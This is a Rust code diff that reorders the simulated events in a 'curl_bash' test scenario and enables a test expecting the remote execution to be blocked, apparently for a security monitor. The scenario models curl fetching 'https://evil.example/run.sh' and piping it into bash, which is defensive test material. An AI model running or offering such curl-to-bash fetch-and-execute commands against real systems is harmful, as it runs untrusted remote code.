@@ -16,40 +16,40 @@ pub fn curl_bash() -> Scenario {
                 command: vec!["curl".into(), "https://evil.example/run.sh".into()],
                 at: Timestamp(1),
             },
-            Event::Connect {
-                process: curl.clone(),
-                fd: Fd(3),
-                endpoint: endpoint.clone(),
-                at: Timestamp(2),
-            },
-            Event::Recv {
-                process: curl.clone(),
-                fd: Fd(3),
-                len: 128,
-                at: Timestamp(3),
-            },
             Event::Pipe {
                 process: curl.clone(),
                 pipe: PipeId(1),
                 read_fd: Fd(4),
                 write_fd: Fd(5),
-                at: Timestamp(4),
-            },
-            Event::Write {
-                process: curl.clone(),
-                fd: Fd(5),
-                len: 128,
-                at: Timestamp(5),
+                at: Timestamp(2),
             },
             Event::Fork {
                 parent: curl.clone(),
                 child: bash.clone(),
-                at: Timestamp(6),
+                at: Timestamp(3),
             },
             Event::Dup {
                 process: bash.clone(),
                 from_fd: Fd(4),
                 to_fd: Fd(0),
+                at: Timestamp(4),
+            },
+            Event::Connect {
+                process: curl.clone(),
+                fd: Fd(3),
+                endpoint: endpoint.clone(),
+                at: Timestamp(5),
+            },
+            Event::Recv {
+                process: curl.clone(),
+                fd: Fd(3),
+                len: 128,
+                at: Timestamp(6),
+            },
+            Event::Write {
+                process: curl.clone(),
+                fd: Fd(5),
+                len: 128,
                 at: Timestamp(7),
             },
             Event::Read {
@@ -77,7 +77,6 @@ mod tests {
     use super::curl_bash;
 
     #[test]
-    #[ignore = "scenario runner not implemented yet"]
     fn curl_bash_blocks_external_exec_with_full_explanation() {
         let scenario = curl_bash();
 
